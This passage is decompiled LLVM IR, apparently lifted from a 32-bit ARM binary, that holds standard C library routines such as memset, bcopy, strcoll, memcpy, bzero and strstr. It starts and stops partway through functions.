  store i16 %v1_11968, i16* %v1_11964, align 2
  %v0_11970 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1197c = inttoptr i32 %v0_11970 to i32*
  store i32 22, i32* %v2_1197c, align 4
  %v0_11988.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11988

dec_label_pc_11984:                               ; preds = %dec_label_pc_11924, %dec_label_pc_11910, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11988

dec_label_pc_11988:                               ; preds = %dec_label_pc_11964, %dec_label_pc_11944, %dec_label_pc_11984
  %v0_11988 = phi i32 [ %v0_11988.pre, %dec_label_pc_11964 ], [ %v2_11958, %dec_label_pc_11944 ], [ 0, %dec_label_pc_11984 ]
  store i32 %v9_118e8, i32* @r6, align 4
  store i32 %v12_118e8, i32* @r7, align 4
  ret i32 %v0_11988

; uselistorder directives
  uselistorder i16* %v1_11964, { 0, 2, 1 }
  uselistorder i32 %v1_11928, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_11988, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11984, { 2, 0, 1 }
}

define i32 @function_11998(i32 %arg1) local_unnamed_addr {
dec_label_pc_11998:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_119a4 = load i32, i32* @r2, align 4
  %v8_119a4 = icmp eq i32 %v0_119a4, 8
  store i1 %v8_119a4, i1* %cpsr_z.global-to-local, align 1
  %v5_119a8 = icmp slt i32 %v0_119a4, 8
  br i1 %v5_119a8, label %dec_label_pc_11a08, label %dec_label_pc_119ac

dec_label_pc_119ac:                               ; preds = %entry
  %v4_119ac = mul i32 %arg2, 256
  %v5_119ac = or i32 %v4_119ac, %arg2
  %v4_119b0 = mul i32 %v5_119ac, 65536
  %v5_119b0 = or i32 %v4_119b0, %v5_119ac
  store i32 %v5_119b0, i32* %r1.global-to-local, align 4
  %v1_119b457 = urem i32 %tmp, 4
  %v2_119b458 = icmp eq i32 %v1_119b457, 0
  store i1 %v2_119b458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_119b458, label %dec_label_pc_119c4, label %bb

bb:                                               ; preds = %dec_label_pc_119ac, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_119ac ]
  %v3_119b859 = phi i32 [ %v6_119b8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_119ac ]
  %v4_119b8 = inttoptr i32 %v3_119b859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_119b8, align 1
  %v5_119b8 = load i32, i32* @r3, align 4
  %v6_119b8 = add i32 %v5_119b8, 1
  store i32 %v6_119b8, i32* @r3, align 4
  %v0_119bc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_119c8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_119bc.pr, label %dec_label_pc_119c4, label %.thread

.thread:                                          ; preds = %bb
  %v2_119bc = add i32 %v0_119c8.pr.pre, -1
  store i32 %v2_119bc, i32* @r2, align 4
  %v1_119b4 = urem i32 %v6_119b8, 4
  %v2_119b4 = icmp eq i32 %v1_119b4, 0
  store i1 %v2_119b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_119b4, label %dec_label_pc_119c4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_119b8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_119b8.pre to i8
  br label %bb

dec_label_pc_119c4:                               ; preds = %.thread, %bb, %dec_label_pc_119ac
  %v0_119d028 = phi i32 [ %tmp, %dec_label_pc_119ac ], [ %v6_119b8, %bb ], [ %v6_119b8, %.thread ]
  %v0_119c8.pr = phi i32 [ %v0_119a4, %dec_label_pc_119ac ], [ %v0_119c8.pr.pre, %bb ], [ %v2_119bc, %.thread ]
  %v0_119c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_119c4, i32* @ip, align 4
  %v8_119c810 = icmp eq i32 %v0_119c8.pr, 8
  store i1 %v8_119c810, i1* %cpsr_z.global-to-local, align 1
  %v5_119cc11 = icmp slt i32 %v0_119c8.pr, 8
  br i1 %v5_119cc11, label %dec_label_pc_11a08, label %dec_label_pc_119d0.preheader

dec_label_pc_119d0.preheader:                     ; preds = %dec_label_pc_119c4
  %v1_119d046 = inttoptr i32 %v0_119d028 to i32*
  store i32 %v0_119c4, i32* %v1_119d046, align 4
  %v3_119d047 = add i32 %v0_119d028, 4
  %v4_119d048 = inttoptr i32 %v3_119d047 to i32*
  %v5_119d049 = load i32, i32* @ip, align 4
  store i32 %v5_119d049, i32* %v4_119d048, align 4
  %v6_119d050 = add i32 %v0_119d028, 8
  store i32 %v6_119d050, i32* @r3, align 4
  %v0_119d451 = load i32, i32* @r2, align 4
  %v1_119d452 = add i32 %v0_119d451, -8
  store i32 %v1_119d452, i32* %r2.global-to-local, align 4
  %v5_119dc53 = icmp slt i32 %v1_119d452, 8
  br i1 %v5_119dc53, label %dec_label_pc_119d0.dec_label_pc_11a08.loopexit_crit_edge, label %dec_label_pc_119e0

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119d0.preheader, %dec_label_pc_119c8.dec_label_pc_119d0_crit_edge
  %v6_119d055 = phi i32 [ %v6_119d0, %dec_label_pc_119c8.dec_label_pc_119d0_crit_edge ], [ %v6_119d050, %dec_label_pc_119d0.preheader ]
  %v0_119d054 = phi i32 [ %v12_119fc, %dec_label_pc_119c8.dec_label_pc_119d0_crit_edge ], [ %v0_119d028, %dec_label_pc_119d0.preheader ]
  %v1_119e0 = inttoptr i32 %v6_119d055 to i32*
  %v2_119e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_119e0, i32* %v1_119e0, align 4
  %v3_119e0 = add i32 %v0_119d054, 12
  %v4_119e0 = inttoptr i32 %v3_119e0 to i32*
  %v5_119e0 = load i32, i32* @ip, align 4
  store i32 %v5_119e0, i32* %v4_119e0, align 4
  %v6_119e0 = add i32 %v0_119d054, 16
  store i32 %v6_119e0, i32* @r3, align 4
  %v0_119e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119e4 = add i32 %v0_119e4, -8
  store i32 %v1_119e4, i32* %r2.global-to-local, align 4
  %v5_119ec = icmp slt i32 %v1_119e4, 8
  br i1 %v5_119ec, label %dec_label_pc_119e0.dec_label_pc_11a08.loopexit_crit_edge, label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %dec_label_pc_119e0
  %v1_119f0 = inttoptr i32 %v6_119e0 to i32*
  %v2_119f0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_119f0, i32* %v1_119f0, align 4
  %v3_119f0 = add i32 %v0_119d054, 20
  %v4_119f0 = inttoptr i32 %v3_119f0 to i32*
  %v5_119f0 = load i32, i32* @ip, align 4
  store i32 %v5_119f0, i32* %v4_119f0, align 4
  %v6_119f0 = add i32 %v0_119d054, 24
  store i32 %v6_119f0, i32* @r3, align 4
  %v0_119f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119f4 = add i32 %v0_119f4, -8
  store i32 %v1_119f4, i32* %r2.global-to-local, align 4
  %v5_119fc = icmp slt i32 %v1_119f4, 8
  br i1 %v5_119fc, label %dec_label_pc_119f0.dec_label_pc_11a08.loopexit_crit_edge, label %dec_label_pc_119c8

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119f0
  %v7_119fc = inttoptr i32 %v6_119f0 to i32*
  %v8_119fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_119fc, i32* %v7_119fc, align 4
  %v9_119fc = add i32 %v0_119d054, 28
  %v10_119fc = inttoptr i32 %v9_119fc to i32*
  %v11_119fc = load i32, i32* @ip, align 4
  store i32 %v11_119fc, i32* %v10_119fc, align 4
  %v12_119fc = add i32 %v0_119d054, 32
  store i32 %v12_119fc, i32* @r3, align 4
  %v6_11a00 = load i32, i32* %r2.global-to-local, align 4
  %v7_11a00 = add i32 %v6_11a00, -8
  store i32 %v7_11a00, i32* %r2.global-to-local, align 4
  %v5_119cc = icmp slt i32 %v7_11a00, 8
  br i1 %v5_119cc, label %dec_label_pc_119c8.dec_label_pc_11a08.loopexit_crit_edge, label %dec_label_pc_119c8.dec_label_pc_119d0_crit_edge

dec_label_pc_119c8.dec_label_pc_119d0_crit_edge:  ; preds = %dec_label_pc_119c8
  %v2_119d0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_119d0 = inttoptr i32 %v12_119fc to i32*
  store i32 %v2_119d0.pre, i32* %v1_119d0, align 4
  %v3_119d0 = add i32 %v0_119d054, 36
  %v4_119d0 = inttoptr i32 %v3_119d0 to i32*
  %v5_119d0 = load i32, i32* @ip, align 4
  store i32 %v5_119d0, i32* %v4_119d0, align 4
  %v6_119d0 = add i32 %v0_119d054, 40
  store i32 %v6_119d0, i32* @r3, align 4
  %v0_119d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119d4 = add i32 %v0_119d4, -8
  store i32 %v1_119d4, i32* %r2.global-to-local, align 4
  %v5_119dc = icmp slt i32 %v1_119d4, 8
  br i1 %v5_119dc, label %dec_label_pc_119d0.dec_label_pc_11a08.loopexit_crit_edge, label %dec_label_pc_119e0

dec_label_pc_119c8.dec_label_pc_11a08.loopexit_crit_edge: ; preds = %dec_label_pc_119c8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11a08

dec_label_pc_119d0.dec_label_pc_11a08.loopexit_crit_edge: ; preds = %dec_label_pc_119c8.dec_label_pc_119d0_crit_edge, %dec_label_pc_119d0.preheader
  %v1_119d4.lcssa = phi i32 [ %v1_119d452, %dec_label_pc_119d0.preheader ], [ %v1_119d4, %dec_label_pc_119c8.dec_label_pc_119d0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11a08

dec_label_pc_119e0.dec_label_pc_11a08.loopexit_crit_edge: ; preds = %dec_label_pc_119e0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11a08

dec_label_pc_119f0.dec_label_pc_11a08.loopexit_crit_edge: ; preds = %dec_label_pc_119f0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119c4, %dec_label_pc_119c8.dec_label_pc_11a08.loopexit_crit_edge, %dec_label_pc_119d0.dec_label_pc_11a08.loopexit_crit_edge, %dec_label_pc_119e0.dec_label_pc_11a08.loopexit_crit_edge, %dec_label_pc_119f0.dec_label_pc_11a08.loopexit_crit_edge, %entry
  %v0_11a10 = phi i32 [ %v0_119a4, %entry ], [ %v1_119f4, %dec_label_pc_119f0.dec_label_pc_11a08.loopexit_crit_edge ], [ %v1_119e4, %dec_label_pc_119e0.dec_label_pc_11a08.loopexit_crit_edge ], [ %v1_119d4.lcssa, %dec_label_pc_119d0.dec_label_pc_11a08.loopexit_crit_edge ], [ %v7_11a00, %dec_label_pc_119c8.dec_label_pc_11a08.loopexit_crit_edge ], [ %v0_119c8.pr, %dec_label_pc_119c4 ]
  %v2_11a08 = icmp eq i32 %v0_11a10, 0
  store i1 %v2_11a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11a08, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11a08
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11a08
  %v1_11a10 = sub i32 7, %v0_11a10
  store i32 %v1_11a10, i32* %r2.global-to-local, align 4
  %v3_11a14 = mul i32 %v1_11a10, 4
  %v4_11a14 = add i32 %v3_11a14, ptrtoint (i32* @global_var_11a1c.400 to i32)
  call void @__pseudo_branch(i32 %v4_11a14)
  %v0_11a1c = load i32, i32* %r1.global-to-local, align 4
  %v1_11a1c = trunc i32 %v0_11a1c to i8
  %v2_11a1c = load i32, i32* @r3, align 4
  %v3_11a1c = inttoptr i32 %v2_11a1c to i8*
  store i8 %v1_11a1c, i8* %v3_11a1c, align 1
  %v4_11a1c = load i32, i32* @r3, align 4
  %v5_11a1c = add i32 %v4_11a1c, 1
  store i32 %v5_11a1c, i32* %r3.global-to-local, align 4
  %v0_11a20 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a20 = trunc i32 %v0_11a20 to i8
  %v3_11a20 = inttoptr i32 %v5_11a1c to i8*
  store i8 %v1_11a20, i8* %v3_11a20, align 1
  %v4_11a20 = load i32, i32* %r3.global-to-local, align 4
  %v5_11a20 = add i32 %v4_11a20, 1
  store i32 %v5_11a20, i32* %r3.global-to-local, align 4
  %v0_11a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a24 = trunc i32 %v0_11a24 to i8
  %v3_11a24 = inttoptr i32 %v5_11a20 to i8*
  store i8 %v1_11a24, i8* %v3_11a24, align 1
  %v4_11a24 = load i32, i32* %r3.global-to-local, align 4
  %v5_11a24 = add i32 %v4_11a24, 1
  store i32 %v5_11a24, i32* %r3.global-to-local, align 4
  %v0_11a28 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a28 = trunc i32 %v0_11a28 to i8
  %v3_11a28 = inttoptr i32 %v5_11a24 to i8*
  store i8 %v1_11a28, i8* %v3_11a28, align 1
  %v4_11a28 = load i32, i32* %r3.global-to-local, align 4
  %v5_11a28 = add i32 %v4_11a28, 1
  store i32 %v5_11a28, i32* %r3.global-to-local, align 4
  %v0_11a2c = load i32, i32* %r1.global-to-local, align 4
  %v1_11a2c = trunc i32 %v0_11a2c to i8
  %v3_11a2c = inttoptr i32 %v5_11a28 to i8*
  store i8 %v1_11a2c, i8* %v3_11a2c, align 1
  %v4_11a2c = load i32, i32* %r3.global-to-local, align 4
  %v5_11a2c = add i32 %v4_11a2c, 1
  store i32 %v5_11a2c, i32* %r3.global-to-local, align 4
  %v0_11a30 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a30 = trunc i32 %v0_11a30 to i8
  %v3_11a30 = inttoptr i32 %v5_11a2c to i8*
  store i8 %v1_11a30, i8* %v3_11a30, align 1
  %v4_11a30 = load i32, i32* %r3.global-to-local, align 4
  %v5_11a30 = add i32 %v4_11a30, 1
  store i32 %v5_11a30, i32* %r3.global-to-local, align 4
  %v0_11a34 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a34 = trunc i32 %v0_11a34 to i8
  %v3_11a34 = inttoptr i32 %v5_11a30 to i8*
  store i8 %v1_11a34, i8* %v3_11a34, align 1
  %v4_11a34 = load i32, i32* %r3.global-to-local, align 4
  %v5_11a34 = add i32 %v4_11a34, 1
  store i32 %v5_11a34, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_119d0, { 1, 0 }
  uselistorder i32 %v12_119fc, { 1, 2, 0 }
  uselistorder i32 %v0_119d054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_119c8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_119b8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_119ac, { 1, 0 }
  uselistorder i32 %v0_119a4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11a08, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_119e0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_11aac = inttoptr i32 %arg2 to i8*
  %v3_11aac = call i32 @_memcpy(i8* %v2_11aac, i32 %arg1)
  ret i32 %v3_11aac
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11ab4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_11ab4 = phi i32 [ %v0_11ab4.pre, %bb ], [ %v5_11ab4, %bb3 ]
  %v0_11ab0 = phi i32 [ %tmp, %bb ], [ %v5_11ab0, %bb3 ]
  %v1_11ab0 = inttoptr i32 %v0_11ab0 to i8*
  %v2_11ab0 = load i8, i8* %v1_11ab0, align 1
  %v1_11ab4 = inttoptr i32 %v0_11ab4 to i8*
  %v2_11ab4 = load i8, i8* %v1_11ab4, align 1
  %v3_11ab4 = zext i8 %v2_11ab4 to i32
  %v2_11ab8 = icmp eq i8 %v2_11ab0, 0
  br i1 %v2_11ab8, label %.dec_label_pc_11ac4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_11ab4 = add i32 %v0_11ab4, 1
  %v5_11ab0 = add i32 %v0_11ab0, 1
  %v3_11ab0 = zext i8 %v2_11ab0 to i32
  %v10_11abc = icmp eq i8 %v2_11ab0, %v2_11ab4
  br i1 %v10_11abc, label %entry, label %dec_label_pc_11ac4

.dec_label_pc_11ac4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_11ac4

dec_label_pc_11ac4:                               ; preds = %bb3, %.dec_label_pc_11ac4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11ac4_crit_edge ], [ %v3_11ab0, %bb3 ]
  %v2_11ac4.pre-phi = sub nsw i32 %.pn, %v3_11ab4
  ret i32 %v2_11ac4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_11ab0, { 0, 2, 1 }
  uselistorder i32 %v0_11ab0, { 1, 0 }
  uselistorder i32 %v0_11ab4, { 1, 0 }
  uselistorder label %dec_label_pc_11ac4, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11ad0 = load i32, i32* @r0, align 4
  %v1_11ad0 = load i32, i32* @r1, align 4
  %v2_11ad0 = inttoptr i32 %v0_11ad0 to i8*
  %v3_11ad0 = call i32 @_memcpy(i8* %v2_11ad0, i32 %v1_11ad0)
  ret i32 %v3_11ad0
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_11ae8 = load i32, i32* @r0, align 4
  %v2_11ae8 = inttoptr i32 %v0_11ae8 to i8*
  %v3_11ae8 = call i32 @__GI_memset(i8* %v2_11ae8, i32 0)
  ret i32 %v3_11ae8
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_11af4 = load i8, i8* %arg2, align 1
  %v2_11af8 = icmp eq i8 %v3_11af4, 0
  %v1_11be8.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_11af8, label %dec_label_pc_11be4, label %dec_label_pc_11b00

dec_label_pc_11b00:                               ; preds = %entry
  %v1_11b00 = add i32 %v1_11be8.pre, -1
  store i32 %v1_11b00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11b10, %dec_label_pc_11b00
  %v0_11b04 = phi i32 [ %v1_11b04, %dec_label_pc_11b10 ], [ %v1_11b00, %dec_label_pc_11b00 ]
  %v1_11b04 = add i32 %v0_11b04, 1
  %v2_11b04 = inttoptr i32 %v1_11b04 to i8*
  %v3_11b04 = load i8, i8* %v2_11b04, align 1
  store i32 %v1_11b04, i32* %r0.global-to-local, align 4
  %v2_11b08 = icmp eq i8 %v3_11b04, 0
  br i1 %v2_11b08, label %dec_label_pc_11be0, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b04
  %v9_11b10 = icmp eq i8 %v3_11b04, %v3_11af4
  br i1 %v9_11b10, label %dec_label_pc_11b18, label %dec_label_pc_11b04

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11b10
  %v2_11b18 = add i32 %tmp, 1
  %v3_11b18 = inttoptr i32 %v2_11b18 to i8*
  %v4_11b18 = load i8, i8* %v3_11b18, align 1
  %v2_11b1c = icmp eq i8 %v4_11b18, 0
  br i1 %v2_11b1c, label %dec_label_pc_11be4, label %dec_label_pc_11b28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b18
  %v1_11b28 = add i32 %v0_11b04, 2
  %v1_11b7c = add i32 %tmp, 2
  %v2_11b7c = inttoptr i32 %v1_11b7c to i8*
  br label %dec_label_pc_11b74

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11bd4
  %v3_11b38 = load i8, i8* %v3_11b6c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b64.preheader

dec_label_pc_11b64.preheader:                     ; preds = %dec_label_pc_11b38, %dec_label_pc_11b74
  %v0_11b643.in = phi i8 [ %v3_11b38, %dec_label_pc_11b38 ], [ %v3_11b6c.pn, %dec_label_pc_11b74 ]
  %v9_11b6412 = icmp eq i8 %v0_11b643.in, %v3_11af4
  br i1 %v9_11b6412, label %dec_label_pc_11b6c, label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11b64.preheader, %dec_label_pc_11b60
  %v0_11b4c = phi i32 [ %v1_11b60, %dec_label_pc_11b60 ], [ %storemerge41, %dec_label_pc_11b64.preheader ]
  %v0_11b44.in = phi i8 [ %v3_11b60, %dec_label_pc_11b60 ], [ %v0_11b643.in, %dec_label_pc_11b64.preheader ]
  %v2_11b44 = icmp eq i8 %v0_11b44.in, 0
  br i1 %v2_11b44, label %dec_label_pc_11be0, label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b44
  %v1_11b4c = add i32 %v0_11b4c, 1
  %v2_11b4c = inttoptr i32 %v1_11b4c to i8*
  %v3_11b4c = load i8, i8* %v2_11b4c, align 1
  store i32 %v1_11b4c, i32* %r0.global-to-local, align 4
  %v9_11b50 = icmp eq i8 %v3_11b4c, %v3_11af4
  br i1 %v9_11b50, label %dec_label_pc_11b6c, label %dec_label_pc_11b58

dec_label_pc_11b58:                               ; preds = %dec_label_pc_11b4c
  %v2_11b58 = icmp eq i8 %v3_11b4c, 0
  br i1 %v2_11b58, label %dec_label_pc_11be0, label %dec_label_pc_11b60

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b58
  %v1_11b60 = add i32 %v0_11b4c, 2
  %v2_11b60 = inttoptr i32 %v1_11b60 to i8*
  %v3_11b60 = load i8, i8* %v2_11b60, align 1
  store i32 %v1_11b60, i32* %r0.global-to-local, align 4
  %v9_11b64 = icmp eq i8 %v3_11b60, %v3_11af4
  br i1 %v9_11b64, label %dec_label_pc_11b6c, label %dec_label_pc_11b44

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b4c, %dec_label_pc_11b60, %dec_label_pc_11b64.preheader
  %v0_11b6c = phi i32 [ %storemerge41, %dec_label_pc_11b64.preheader ], [ %v1_11b4c, %dec_label_pc_11b4c ], [ %v1_11b60, %dec_label_pc_11b60 ]
  %v1_11b6c = add i32 %v0_11b6c, 1
  br label %dec_label_pc_11b74

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11b28, %dec_label_pc_11b6c
  %storemerge41 = phi i32 [ %v1_11b6c, %dec_label_pc_11b6c ], [ %v1_11b28, %dec_label_pc_11b28 ]
  %v3_11b6c.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_11b6c.pn = load i8, i8* %v3_11b6c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_11b6c.pn, %v4_11b18
  br i1 %storemerge, label %dec_label_pc_11b78, label %dec_label_pc_11b64.preheader

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b74
  %v1_11b78 = add i32 %storemerge41, 1
  %v2_11b78 = inttoptr i32 %v1_11b78 to i8*
  %v3_11b78 = load i8, i8* %v2_11b78, align 1
  %v4_11b78 = zext i8 %v3_11b78 to i32
  %v3_11b7c = load i8, i8* %v2_11b7c, align 1
  %v4_11b7c = zext i8 %v3_11b7c to i32
  %v9_11b84 = icmp eq i8 %v3_11b78, %v3_11b7c
  %v1_11b8c = add i32 %storemerge41, -1
  store i32 %v1_11b8c, i32* %r0.global-to-local, align 4
  br i1 %v9_11b84, label %dec_label_pc_11b94, label %dec_label_pc_11bd4

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b78, %dec_label_pc_11bc4
  %v0_11bac = phi i32 [ %v1_11bb4, %dec_label_pc_11bc4 ], [ %v1_11b7c, %dec_label_pc_11b78 ]
  %v0_11ba4 = phi i32 [ %v1_11bb0, %dec_label_pc_11bc4 ], [ %v1_11b78, %dec_label_pc_11b78 ]
  %v0_11b94 = phi i32 [ %v4_11bc4, %dec_label_pc_11bc4 ], [ %v4_11b78, %dec_label_pc_11b78 ]
  %v2_11b94 = icmp eq i32 %v0_11b94, 0
  br i1 %v2_11b94, label %dec_label_pc_11be4, label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b94
  %v1_11b9c = add i32 %v0_11ba4, 1
  %v2_11b9c = inttoptr i32 %v1_11b9c to i8*
  %v3_11b9c = load i8, i8* %v2_11b9c, align 1
  %v1_11ba0 = add i32 %v0_11bac, 1
  %v2_11ba0 = inttoptr i32 %v1_11ba0 to i8*
  %v3_11ba0 = load i8, i8* %v2_11ba0, align 1
  %v4_11ba0 = zext i8 %v3_11ba0 to i32
  store i32 %v1_11b9c, i32* @r1, align 4
  %v9_11ba8 = icmp eq i8 %v3_11b9c, %v3_11ba0
  %v1_11bb0 = add i32 %v0_11ba4, 2
  %v1_11bb4 = add i32 %v0_11bac, 2
  br i1 %v9_11ba8, label %dec_label_pc_11bbc, label %dec_label_pc_11bd4

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11b9c
  %v2_11bbc = icmp eq i8 %v3_11b9c, 0
  br i1 %v2_11bbc, label %dec_label_pc_11be4, label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11bbc
  %v2_11bc4 = inttoptr i32 %v1_11bb4 to i8*
  %v3_11bc4 = load i8, i8* %v2_11bc4, align 1
  %v4_11bc4 = zext i8 %v3_11bc4 to i32
  %v2_11bc8 = inttoptr i32 %v1_11bb0 to i8*
  %v3_11bc8 = load i8, i8* %v2_11bc8, align 1
  %v9_11bcc = icmp eq i8 %v3_11bc8, %v3_11bc4
  br i1 %v9_11bcc, label %dec_label_pc_11b94, label %dec_label_pc_11bd4

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_11bc4, %dec_label_pc_11b9c, %dec_label_pc_11b78
  %v0_11bd4 = phi i32 [ %v4_11b7c, %dec_label_pc_11b78 ], [ %v4_11bc4, %dec_label_pc_11bc4 ], [ %v4_11ba0, %dec_label_pc_11b9c ]
  %v2_11bd4 = icmp eq i32 %v0_11bd4, 0
  br i1 %v2_11bd4, label %dec_label_pc_11be4, label %dec_label_pc_11b38

dec_label_pc_11be0:                               ; preds = %dec_label_pc_11b04, %dec_label_pc_11b58, %dec_label_pc_11b44
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bd4, %dec_label_pc_11bbc, %dec_label_pc_11b94, %entry, %dec_label_pc_11b18, %dec_label_pc_11be0
  %v1_11be8 = phi i32 [ %v1_11b04, %dec_label_pc_11b18 ], [ 0, %dec_label_pc_11be0 ], [ %v1_11be8.pre, %entry ], [ %v1_11b8c, %dec_label_pc_11b94 ], [ %v1_11b8c, %dec_label_pc_11bbc ], [ %v1_11b8c, %dec_label_pc_11bd4 ]
  ret i32 %v1_11be8

; uselistorder directives
  uselistorder i32 %v1_11bb0, { 1, 0 }
  uselistorder i8 %v3_11b6c.pn, { 1, 0 }
  uselistorder i8* %v3_11b6c.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_11b60, { 1, 0 }
  uselistorder i32 %v1_11b60, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11b04, { 0, 2, 3, 1 }
  uselistorder i8 %v3_11af4, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 9, 5, 6, 3, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_11be4, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_11be0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11b94, { 1, 0 }
  uselistorder label %dec_label_pc_11b74, { 1, 0 }
  uselistorder label %dec_label_pc_11b6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b44, { 1, 0 }
